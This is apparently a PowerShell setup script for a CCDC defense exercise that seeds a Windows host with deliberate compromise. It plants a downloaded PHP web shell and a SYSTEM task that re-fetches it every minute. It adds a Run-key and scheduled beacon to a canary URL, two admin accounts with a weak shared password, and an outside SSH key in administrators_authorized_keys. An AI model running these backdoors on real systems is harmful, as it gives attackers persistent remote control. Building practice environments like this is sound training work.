#Requires -Version 5.1
#Requires -RunAsAdministrator

[CmdletBinding()]
param(
    [switch]$Verify,
    [string]$RepoUrl,
    [string]$IndexUrl,
    [string]$IndexSha256,
    [string]$RootKeyUrl,
    [string]$RootKeyBlob,
    [string]$LabServer,
    [string]$CanaryUrl,
    [string]$LabPassword,
    [string]$XamppDir,
    [string]$WebRoot
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072

# Redhavi: CCDC practice scenario for Windows 10/11 and Windows Server.
$script:ScenarioVersion = 7
$script:ExpectedChecks = 11
$script:TaskName = "Redhavi-IndexRefresh"
$script:CanaryTaskName = "Redhavi-CanaryCheckin"
$script:CanaryIntervalMinutes = 3
$script:RunKeyPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
$script:RunValueName = "RedhaviIndexRefresh"
$script:StateDir = Join-Path $env:ProgramData "redhavi"
$script:StateFile = Join-Path $script:StateDir "state-win.json"
$script:RefreshScript = Join-Path $script:StateDir "redhavi-index-refresh.ps1"
$script:CanaryScript = Join-Path $script:StateDir "redhavi-registry-canary.ps1"
$script:KeyReference = Join-Path $script:StateDir "administrator-key.pub"
$script:AuthorizedKeys = Join-Path $env:ProgramData "ssh\administrators_authorized_keys"
$script:StateStarted = $false
$script:CurrentStep = "startup"

function Get-Setting {
    param(
        [AllowEmptyString()][string]$Value,
        [Parameter(Mandatory)][string]$EnvironmentName,
        [Parameter(Mandatory)][string]$DefaultValue
    )

    if (-not [string]::IsNullOrWhiteSpace($Value)) {
        return $Value
    }

    $environmentValue = [Environment]::GetEnvironmentVariable($EnvironmentName)
    if (-not [string]::IsNullOrWhiteSpace($environmentValue)) {
        return $environmentValue
    }

    return $DefaultValue
}

$script:RepoUrl = Get-Setting $RepoUrl "REDHAVI_WEB_REPO_URL" "https://github.com/banago/simple-php-website.git"
$script:IndexUrl = Get-Setting $IndexUrl "REDHAVI_INDEX_URL" "https://raw.githubusercontent.com/4rji/ccdc/main/index.php"
$script:IndexSha256 = (Get-Setting $IndexSha256 "REDHAVI_INDEX_SHA256" "adaa044087382af0901cde807ebff2add6391ad7a60250a0650f424758ef3e6e").ToLowerInvariant()
$script:RootKeyUrl = Get-Setting $RootKeyUrl "REDHAVI_ROOT_KEY_URL" "https://raw.githubusercontent.com/4rji/4rji/main/id_ed25519.pub"
$script:RootKeyBlob = Get-Setting $RootKeyBlob "REDHAVI_ROOT_KEY_BLOB" "AAAAC3NzaC1lZDI1NTE5AAAAILvd2Ok5Jk5HN1XFacHqgh+c2PhAr26Z8FZ130iaVDUB"
$script:LabServer = Get-Setting $LabServer "REDHAVI_LAB_SERVER" "10.5.8.11"
$script:RefreshUrl = "http://$($script:LabServer)/index.php"
$script:CanaryUrl = Get-Setting $CanaryUrl "REDHAVI_CANARY_URL" "http://172.16.101.77:8081/checkin"
$script:LabPassword = Get-Setting $LabPassword "REDHAVI_LAB_PASSWORD" "!Password123"
$script:XamppDir = Get-Setting $XamppDir "REDHAVI_XAMPP_DIR" "C:\xampp"
$script:WebRootWasSpecified = -not [string]::IsNullOrWhiteSpace($WebRoot) -or -not [string]::IsNullOrWhiteSpace($env:REDHAVI_WEB_ROOT)
$script:WebRoot = Get-Setting $WebRoot "REDHAVI_WEB_ROOT" (Join-Path $script:XamppDir "htdocs\simple-php-website")
$script:IndexPath = Join-Path $script:WebRoot "index.php"

function Write-Log {
    param([Parameter(Mandatory)][string]$Message)
    Write-Host "[redhavi-win] $Message"
}

function Write-Warn {
    param([Parameter(Mandatory)][string]$Message)
    Write-Warning "[redhavi-win] $Message"
}

function Invoke-Native {
    param(
        [Parameter(Mandatory)][string]$FilePath,
        [Parameter(Mandatory)][string[]]$Arguments,
        [int[]]$SuccessExitCodes = @(0)
    )

    & $FilePath @Arguments
    $exitCode = $LASTEXITCODE
    if ($SuccessExitCodes -notcontains $exitCode) {
        throw "Native command failed ($exitCode): $FilePath $($Arguments -join ' ')"
    }
}

function Write-State {
    param([Parameter(Mandatory)][ValidateSet("incomplete", "ready")][string]$Status)

    New-Item -ItemType Directory -Force -Path $script:StateDir | Out-Null
    $temporaryState = "$($script:StateFile).$PID.tmp"
    $state = [ordered]@{
        scenario         = "redhavi-win"
        version          = $script:ScenarioVersion
        status           = $Status
        expected_checks  = $script:ExpectedChecks
        step             = $script:CurrentStep
        updated_at       = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
        web_root         = $script:WebRoot
        index_path       = $script:IndexPath
        authorized_keys  = $script:AuthorizedKeys
        root_key_blob    = $script:RootKeyBlob
        task_name        = $script:TaskName
        refresh_url      = $script:RefreshUrl
        refresh_script   = $script:RefreshScript
        canary_task_name = $script:CanaryTaskName
        canary_interval  = $script:CanaryIntervalMinutes
        run_key_path     = $script:RunKeyPath
        run_value_name   = $script:RunValueName
        canary_url       = $script:CanaryUrl
        canary_script    = $script:CanaryScript
    }

    $state | ConvertTo-Json | Set-Content -LiteralPath $temporaryState -Encoding UTF8
    Move-Item -LiteralPath $temporaryState -Destination $script:StateFile -Force
}

function Test-StateReady {
    if (-not (Test-Path -LiteralPath $script:StateFile -PathType Leaf)) {
        return $false
    }

    try {
        $state = Get-Content -LiteralPath $script:StateFile -Raw | ConvertFrom-Json
        return (
            $state.scenario -eq "redhavi-win" -and
            [int]$state.version -eq $script:ScenarioVersion -and
            $state.status -eq "ready" -and
            [int]$state.expected_checks -eq $script:ExpectedChecks
        )
    } catch {
        return $false
    }
}

function Resolve-XamppPaths {
    $candidates = @($script:XamppDir, "C:\xampp", "C:\tools\xampp") | Select-Object -Unique
    foreach ($candidate in $candidates) {
        $httpd = Join-Path $candidate "apache\bin\httpd.exe"
        if (Test-Path -LiteralPath $httpd -PathType Leaf) {
            if (-not $script:WebRootWasSpecified -and $candidate -ne $script:XamppDir) {
                $script:WebRoot = Join-Path $candidate "htdocs\simple-php-website"
                $script:IndexPath = Join-Path $script:WebRoot "index.php"
            }
            $script:XamppDir = $candidate
            return
        }
    }

    throw "XAMPP was not found. Checked paths: $($candidates -join ', ')"
}

function Ensure-Chocolatey {
    $command = Get-Command choco.exe -ErrorAction SilentlyContinue
    if ($command) {
        return $command.Source
    }

    Write-Log "Installing Chocolatey..."
    Set-ExecutionPolicy Bypass -Scope Process -Force
    $installer = (New-Object Net.WebClient).DownloadString("https://community.chocolatey.org/install.ps1")
    Invoke-Expression $installer | Out-Host
    $env:Path = "$env:Path;$env:ProgramData\chocolatey\bin"

    $command = Get-Command choco.exe -ErrorAction SilentlyContinue
    if (-not $command) {
        throw "Chocolatey is still unavailable after installation."
    }
    return $command.Source
}

function Assert-ChocolateyReady {
    param([Parameter(Mandatory)][string]$Path)

    $previousErrorActionPreference = $ErrorActionPreference
    $versionOutput = @()
    $exitCode = -1
    try {
        $ErrorActionPreference = "Continue"
        $versionOutput = @(& $Path "--version" 2>&1)
        $exitCode = $LASTEXITCODE
    } finally {
        $ErrorActionPreference = $previousErrorActionPreference
    }

    if ($exitCode -eq 0) {
        return
    }

    $details = ($versionOutput | ForEach-Object { $_.ToString() }) -join [Environment]::NewLine
    if ($details -match "(?i)(\.NET(?: Framework)? 4\.8.*(?:reboot|restart)|restart this machine|reboot.*complete installation)") {
        throw "REBOOT_REQUIRED::Chocolatey installed .NET Framework 4.8, but Windows must restart before Chocolatey can run."
    }
    if ([string]::IsNullOrWhiteSpace($details)) {
        $details = "Chocolatey exited with status $exitCode."
    }
    throw "Chocolatey could not start: $details"
}

function Install-Packages {
    Write-Log "Installing Git, curl, Notepad++, and XAMPP 8.1..."
    $choco = Ensure-Chocolatey
    Assert-ChocolateyReady $choco
    foreach ($package in @("git", "curl", "notepadplusplus", "xampp-81")) {
        Invoke-Native -FilePath $choco -Arguments @("install", $package, "-y", "--no-progress") -SuccessExitCodes @(0, 1641, 3010)
    }
    $env:Path = "$env:Path;$env:ProgramFiles\Git\cmd;$env:ProgramData\chocolatey\bin"
    Resolve-XamppPaths
}

function Resolve-GitExe {
    $command = Get-Command git.exe -ErrorAction SilentlyContinue
    if ($command) {
        return $command.Source
    }

    $candidates = @(
        (Join-Path $env:ProgramFiles "Git\cmd\git.exe"),
        (Join-Path $env:ProgramFiles "Git\bin\git.exe"),
        (Join-Path $env:LocalAppData "Programs\Git\cmd\git.exe")
    )
    if (-not [string]::IsNullOrWhiteSpace(${env:ProgramFiles(x86)})) {
        $candidates += Join-Path ${env:ProgramFiles(x86)} "Git\cmd\git.exe"
    }
    foreach ($candidate in $candidates) {
        if (Test-Path -LiteralPath $candidate -PathType Leaf) {
            return $candidate
        }
    }
    throw "git.exe is unavailable."
}

function Test-PayloadValid {
    param([Parameter(Mandatory)][string]$Path)

    if (-not (Test-Path -LiteralPath $Path -PathType Leaf)) {
        return $false
    }
    if (-not (Select-String -LiteralPath $Path -SimpleMatch "shell_exec" -Quiet)) {
        return $false
    }
    $actualHash = (Get-FileHash -LiteralPath $Path -Algorithm SHA256).Hash.ToLowerInvariant()
    return $actualHash -eq $script:IndexSha256
}

function Unlock-LabFile {
    param([Parameter(Mandatory)][string]$Path)

    if (-not (Test-Path -LiteralPath $Path)) {
        return
    }
    Invoke-Native -FilePath "attrib.exe" -Arguments @("-R", $Path)
    Invoke-Native -FilePath "icacls.exe" -Arguments @($Path, "/reset", "/C")
}

function Lock-LabFile {
    param(
        [Parameter(Mandatory)][string]$Path,
        [switch]$AdministratorsOnly
    )

    Invoke-Native -FilePath "icacls.exe" -Arguments @($Path, "/inheritance:r")
    $grantArguments = @(
        $Path,
        "/grant:r",
        "*S-1-5-32-544:(F)",
        "*S-1-5-18:(F)"
    )
    if (-not $AdministratorsOnly) {
        $grantArguments += "*S-1-5-32-545:(R)"
    }
    Invoke-Native -FilePath "icacls.exe" -Arguments $grantArguments
    Invoke-Native -FilePath "attrib.exe" -Arguments @("+R", $Path)
}

function Test-LabFileLocked {
    param([Parameter(Mandatory)][string]$Path)

    if (-not (Test-Path -LiteralPath $Path -PathType Leaf)) {
        return $false
    }
    $item = Get-Item -LiteralPath $Path -Force
    $acl = Get-Acl -LiteralPath $Path
    return (
        [bool]($item.Attributes -band [IO.FileAttributes]::ReadOnly) -and
        $acl.AreAccessRulesProtected
    )
}

function Test-DirectoryEmpty {
    param([Parameter(Mandatory)][string]$Path)
    return -not [bool](Get-ChildItem -LiteralPath $Path -Force -ErrorAction Stop | Select-Object -First 1)
}

function Setup-WebContent {
    Write-Log "Preparing the lab PHP site..."
    $git = Resolve-GitExe
    $parent = Split-Path -Parent $script:WebRoot
    New-Item -ItemType Directory -Force -Path $parent | Out-Null

    if (Test-Path -LiteralPath (Join-Path $script:WebRoot ".git") -PathType Container) {
        try {
            Invoke-Native -FilePath $git -Arguments @("-C", $script:WebRoot, "pull", "--ff-only")
        } catch {
            Write-Warn "Could not update the existing repository; keeping its current content."
        }
    } elseif ((Test-Path -LiteralPath $script:WebRoot -PathType Container) -and -not (Test-DirectoryEmpty $script:WebRoot)) {
        Write-Warn "$($script:WebRoot) already exists and is not a Git repository; it will not be overwritten by a clone."
    } else {
        if (Test-Path -LiteralPath $script:WebRoot) {
            Remove-Item -LiteralPath $script:WebRoot -Force
        }
        Invoke-Native -FilePath $git -Arguments @("clone", $script:RepoUrl, $script:WebRoot)
    }

    New-Item -ItemType Directory -Force -Path $script:StateDir, $script:WebRoot | Out-Null
    $temporaryPayload = Join-Path $script:StateDir "index.$PID.tmp"
    try {
        Invoke-WebRequest -UseBasicParsing -Uri $script:IndexUrl -OutFile $temporaryPayload
        if (-not (Test-PayloadValid $temporaryPayload)) {
            throw "The PHP payload does not contain shell_exec or does not match the expected SHA-256 hash."
        }

        Unlock-LabFile $script:IndexPath
        Copy-Item -LiteralPath $temporaryPayload -Destination $script:IndexPath -Force
        Lock-LabFile $script:IndexPath
    } finally {
        Remove-Item -LiteralPath $temporaryPayload -Force -ErrorAction SilentlyContinue
    }
}

function Write-RefreshScript {
    $escapedUrl = $script:RefreshUrl.Replace("'", "''")
    $escapedPath = $script:IndexPath.Replace("'", "''")
    $content = @(
        '$ErrorActionPreference = "SilentlyContinue"',
        "Invoke-WebRequest -UseBasicParsing -Uri '$escapedUrl' -OutFile '$escapedPath'"
    )
    $content | Set-Content -LiteralPath $script:RefreshScript -Encoding UTF8
}

function Register-PeriodicSystemTask {
    param(
        [Parameter(Mandatory)][string]$Name,
        [Parameter(Mandatory)][string]$ScriptPath,
        [Parameter(Mandatory)][ValidateRange(1, 1440)][int]$IntervalMinutes
    )

    $powerShellExe = Join-Path $env:SystemRoot "System32\WindowsPowerShell\v1.0\powershell.exe"
    $arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
    $action = New-ScheduledTaskAction -Execute $powerShellExe -Argument $arguments
    $trigger = New-ScheduledTaskTrigger `
        -Once `
        -At (Get-Date).AddMinutes(1) `
        -RepetitionInterval ([TimeSpan]::FromMinutes($IntervalMinutes)) `
        -RepetitionDuration ([TimeSpan]::FromDays(3650))
    $principal = New-ScheduledTaskPrincipal `
        -UserId "SYSTEM" `
        -LogonType ServiceAccount `
        -RunLevel Highest

    Register-ScheduledTask `
        -TaskName $Name `
        -Action $action `
        -Trigger $trigger `
        -Principal $principal `
        -Force | Out-Null
}

function Setup-RefreshTask {
    Write-Log "Creating the persistence scheduled task..."
    Write-RefreshScript
    Register-PeriodicSystemTask `
        -Name $script:TaskName `
        -ScriptPath $script:RefreshScript `
        -IntervalMinutes 1
}

function Setup-RegistryPersistence {
    Write-Log "Creating logon persistence in the registry..."
    $escapedCanaryUrl = $script:CanaryUrl.Replace("'", "''")
    $canaryContent = @(
        '$ErrorActionPreference = "SilentlyContinue"',
        "Invoke-RestMethod -Uri '$escapedCanaryUrl' | Out-Null"
    )
    $canaryContent | Set-Content -LiteralPath $script:CanaryScript -Encoding UTF8

    $command = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($script:CanaryScript)`""
    if ($command.Length -gt 260) {
        throw "The canary registry command exceeds the 260-character limit."
    }
    New-Item -Path $script:RunKeyPath -Force | Out-Null
    New-ItemProperty `
        -Path $script:RunKeyPath `
        -Name $script:RunValueName `
        -PropertyType String `
        -Value $command `
        -Force | Out-Null
}

function Setup-PeriodicCanaryTask {
    Write-Log "Creating a periodic canary call every $($script:CanaryIntervalMinutes) minutes..."
    Register-PeriodicSystemTask `
        -Name $script:CanaryTaskName `
        -ScriptPath $script:CanaryScript `
        -IntervalMinutes $script:CanaryIntervalMinutes
}

function Get-AdministratorsGroup {
    $group = Get-CimInstance Win32_Group -Filter "LocalAccount=True AND SID='S-1-5-32-544'" | Select-Object -First 1
    if (-not $group) {
        throw "The local Administrators group (S-1-5-32-544) was not found."
    }
    return $group.Name
}

function Ensure-LabUser {
    param(
        [Parameter(Mandatory)][string]$Name,
        [Parameter(Mandatory)][string]$Password,
        [switch]$MustChangePassword
    )

    $securePassword = ConvertTo-SecureString $Password -AsPlainText -Force
    $user = Get-LocalUser -Name $Name -ErrorAction SilentlyContinue
    if ($user) {
        Write-Log "Restoring the vulnerable state for user $Name..."
        Set-LocalUser -Name $Name -Password $securePassword
        Enable-LocalUser -Name $Name
    } else {
        Write-Log "Creating local user $Name..."
        New-LocalUser -Name $Name -Password $securePassword -Description "Redhavi CCDC lab account" | Out-Null
    }

    $administrators = Get-AdministratorsGroup
    $user = Get-LocalUser -Name $Name
    $isMember = Get-LocalGroupMember -Group $administrators -ErrorAction Stop |
        Where-Object { $_.SID -eq $user.SID }
    if (-not $isMember) {
        Add-LocalGroupMember -Group $administrators -Member $Name
    }

    if ($MustChangePassword) {
        Set-LocalUser -Name $Name -PasswordNeverExpires $false
        $adsiUser = [ADSI]"WinNT://$env:COMPUTERNAME/$Name,user"
        $adsiUser.Put("PasswordExpired", 1)
        $adsiUser.SetInfo()
    }
}

function Setup-LabUsers {
    Write-Log "Configuring local practice users..."
    Ensure-LabUser -Name "ccdc" -Password $script:LabPassword -MustChangePassword
    Ensure-LabUser -Name "splunk" -Password $script:LabPassword
}

function Get-KeyBlobFromLine {
    param([Parameter(Mandatory)][string]$Line)
    $parts = @($Line.Trim() -split "\s+")
    if ($parts.Count -lt 2) {
        return ""
    }
    return $parts[1]
}

function Test-KeyFileHasBlob {
    param(
        [Parameter(Mandatory)][string]$Path,
        [Parameter(Mandatory)][string]$Blob
    )

    if (-not (Test-Path -LiteralPath $Path -PathType Leaf)) {
        return $false
    }
    foreach ($line in Get-Content -LiteralPath $Path -ErrorAction Stop) {
        $tokens = @($line.Trim() -split "\s+")
        if ($tokens -contains $Blob) {
            return $true
        }
    }
    return $false
}

function Setup-AdministratorKey {
    Write-Log "Adding the lab SSH key without removing legitimate keys..."
    New-Item -ItemType Directory -Force -Path $script:StateDir, (Split-Path -Parent $script:AuthorizedKeys) | Out-Null
    $temporaryKey = Join-Path $script:StateDir "key.$PID.tmp"
    try {
        Invoke-WebRequest -UseBasicParsing -Uri $script:RootKeyUrl -OutFile $temporaryKey
        $activeLines = @(Get-Content -LiteralPath $temporaryKey | Where-Object {
            -not [string]::IsNullOrWhiteSpace($_) -and -not $_.TrimStart().StartsWith("#")
        })
        if ($activeLines.Count -ne 1 -or (Get-KeyBlobFromLine $activeLines[0]) -ne $script:RootKeyBlob) {
            throw "The downloaded key does not match the expected public key."
        }

        Set-Content -LiteralPath $script:KeyReference -Value $activeLines[0] -Encoding ASCII
        Unlock-LabFile $script:AuthorizedKeys
        if (-not (Test-Path -LiteralPath $script:AuthorizedKeys)) {
            New-Item -ItemType File -Path $script:AuthorizedKeys -Force | Out-Null
        }
        if (-not (Test-KeyFileHasBlob $script:AuthorizedKeys $script:RootKeyBlob)) {
            Add-Content -LiteralPath $script:AuthorizedKeys -Value $activeLines[0] -Encoding ASCII
        }
        Lock-LabFile $script:AuthorizedKeys -AdministratorsOnly
    } finally {
        Remove-Item -LiteralPath $temporaryKey -Force -ErrorAction SilentlyContinue
    }
}

function Ensure-OpenSshServer {
    Write-Log "Installing and starting OpenSSH Server..."
    $capability = Get-WindowsCapability -Online |
        Where-Object { $_.Name -like "OpenSSH.Server*" } |
        Select-Object -First 1

    if (-not $capability) {
        throw "OpenSSH Server is not available as a Windows capability."
    }
    if ($capability.State -ne "Installed") {
        Add-WindowsCapability -Online -Name $capability.Name | Out-Null
    }

    Set-Service -Name "sshd" -StartupType Automatic
    Start-Service -Name "sshd"
    if (-not (Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue)) {
        New-NetFirewallRule `
            -Name "OpenSSH-Server-In-TCP" `
            -DisplayName "OpenSSH Server (sshd)" `
            -Enabled True `
            -Direction Inbound `
            -Protocol TCP `
            -Action Allow `
            -LocalPort 22 | Out-Null
    }
}

function Enable-InsecureFeatures {
    Write-Log "Enabling the Telnet and TFTP clients for the exercise..."
    foreach ($featureName in @("TelnetClient", "TFTP")) {
        $feature = Get-WindowsOptionalFeature -Online -FeatureName $featureName
        if ($feature.State -ne "Enabled") {
            Enable-WindowsOptionalFeature -Online -FeatureName $featureName -All -NoRestart | Out-Null
        }
    }
}

function Test-FeatureEnabled {
    param([Parameter(Mandatory)][string]$Name)
    return (Get-WindowsOptionalFeature -Online -FeatureName $Name).State -eq "Enabled"
}

function Test-LabUserSeeded {
    param([Parameter(Mandatory)][string]$Name)

    $user = Get-LocalUser -Name $Name -ErrorAction SilentlyContinue
    if (-not $user -or -not $user.Enabled) {
        return $false
    }
    $administrators = Get-AdministratorsGroup
    return [bool](Get-LocalGroupMember -Group $administrators -ErrorAction Stop |
        Where-Object { $_.SID -eq $user.SID })
}

function Test-RefreshTaskSeeded {
    $task = Get-ScheduledTask -TaskName $script:TaskName -ErrorAction SilentlyContinue
    if (-not $task) {
        return $false
    }
    $actionText = ($task.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments)" }) -join " "
    if (-not $actionText.Contains($script:RefreshScript)) {
        return $false
    }
    if (-not (Test-Path -LiteralPath $script:RefreshScript -PathType Leaf)) {
        return $false
    }
    $refreshContent = Get-Content -LiteralPath $script:RefreshScript -Raw -ErrorAction Stop
    return $refreshContent.Contains($script:RefreshUrl) -and $refreshContent.Contains($script:IndexPath)
}

function Test-RegistryPersistenceSeeded {
    if (-not (Test-Path -Path $script:RunKeyPath)) {
        return $false
    }
    $properties = Get-ItemProperty -Path $script:RunKeyPath -ErrorAction Stop
    $property = $properties.PSObject.Properties[$script:RunValueName]
    if (-not $property) {
        return $false
    }
    $value = [string]$property.Value
    if (-not (Test-Path -LiteralPath $script:CanaryScript -PathType Leaf)) {
        return $false
    }
    $canaryContent = Get-Content -LiteralPath $script:CanaryScript -Raw -ErrorAction Stop
    return (
        $value.Contains($script:CanaryScript) -and
        $canaryContent.Contains($script:CanaryUrl) -and
        $canaryContent.Contains('Invoke-RestMethod')
    )
}

function Test-PeriodicCanaryTaskSeeded {
    $task = Get-ScheduledTask -TaskName $script:CanaryTaskName -ErrorAction SilentlyContinue
    if (-not $task) {
        return $false
    }
    $actionText = ($task.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments)" }) -join " "
    $hasInterval = [bool]($task.Triggers | Where-Object {
        $_.Repetition.Interval -eq "PT$($script:CanaryIntervalMinutes)M"
    })
    return $actionText.Contains($script:CanaryScript) -and $hasInterval
}

function Invoke-PostValidation {
    $failures = 0
    $checks = @(
        @{ Label = "ccdc user enabled with administrator privileges"; Test = { Test-LabUserSeeded "ccdc" } },
        @{ Label = "splunk user enabled with administrator privileges"; Test = { Test-LabUserSeeded "splunk" } },
        @{ Label = "scheduled task seeded"; Test = { Test-RefreshTaskSeeded } },
        @{ Label = "registry persistence seeded"; Test = { Test-RegistryPersistenceSeeded } },
        @{ Label = "three-minute canary task seeded"; Test = { Test-PeriodicCanaryTaskSeeded } },
        @{ Label = "valid PHP payload"; Test = { Test-PayloadValid $script:IndexPath } },
        @{ Label = "PHP payload locked"; Test = { Test-LabFileLocked $script:IndexPath } },
        @{ Label = "exact SSH key seeded"; Test = { Test-KeyFileHasBlob $script:AuthorizedKeys $script:RootKeyBlob } },
        @{ Label = "authorized_keys locked"; Test = { Test-LabFileLocked $script:AuthorizedKeys } },
        @{ Label = "OpenSSH Server active"; Test = { (Get-Service -Name "sshd").Status -eq "Running" } },
        @{ Label = "Telnet enabled"; Test = { Test-FeatureEnabled "TelnetClient" } },
        @{ Label = "TFTP enabled"; Test = { Test-FeatureEnabled "TFTP" } }
    )

    foreach ($check in $checks) {
        try {
            if ([bool](& $check.Test)) {
                Write-Log "POSTCHECK OK: $($check.Label)"
            } else {
                Write-Warn "POSTCHECK FAILED: $($check.Label)"
                $failures++
            }
        } catch {
            Write-Warn "POSTCHECK ERROR: $($check.Label): $($_.Exception.Message)"
            $failures++
        }
    }

    return $failures -eq 0
}

function Invoke-Redhavi {
    if ($Verify) {
        Resolve-XamppPaths
        if (-not (Invoke-PostValidation)) {
            throw "The Windows deployment is incomplete."
        }
        if (-not (Test-StateReady)) {
            throw "The artifacts exist, but the state marker is not ready."
        }
        Write-Log "The deployment is complete and ready for the exercise."
        return
    }

    $script:CurrentStep = "incomplete state marker"
    Write-State "incomplete"
    $script:StateStarted = $true

    $script:CurrentStep = "package installation"
    Install-Packages

    $script:CurrentStep = "web content"
    Setup-WebContent

    $script:CurrentStep = "scheduled task"
    Setup-RefreshTask

    $script:CurrentStep = "registry persistence"
    Setup-RegistryPersistence

    $script:CurrentStep = "periodic canary task"
    Setup-PeriodicCanaryTask

    $script:CurrentStep = "users"
    Setup-LabUsers

    $script:CurrentStep = "SSH key"
    Ensure-OpenSshServer
    Setup-AdministratorKey

    $script:CurrentStep = "insecure features"
    Enable-InsecureFeatures

    $script:CurrentStep = "post-validation"
    if (-not (Invoke-PostValidation)) {
        throw "Post-validation found an incomplete deployment."
    }

    $script:CurrentStep = "ready"
    Write-State "ready"
    if (-not (Test-StateReady)) {
        throw "Could not publish the ready state."
    }
    Write-Log "The Redhavi Windows scenario was seeded and verified successfully."
}

try {
    Invoke-Redhavi
} catch {
    if ($script:StateStarted) {
        try { Write-State "incomplete" } catch { }
    }
    $failureMessage = $_.Exception.Message
    if ($failureMessage.StartsWith("REBOOT_REQUIRED::")) {
        $reason = $failureMessage.Substring("REBOOT_REQUIRED::".Length)
        Write-Host "[redhavi-win][REBOOT REQUIRED] $reason" -ForegroundColor Yellow
        Write-Host "Restart Windows, open an elevated PowerShell session, and run redhaviwin.ps1 again." -ForegroundColor Yellow
        exit 3010
    }
    Write-Host "[redhavi-win][ERROR] Failure during '$($script:CurrentStep)': $failureMessage" -ForegroundColor Red
    exit 1
}
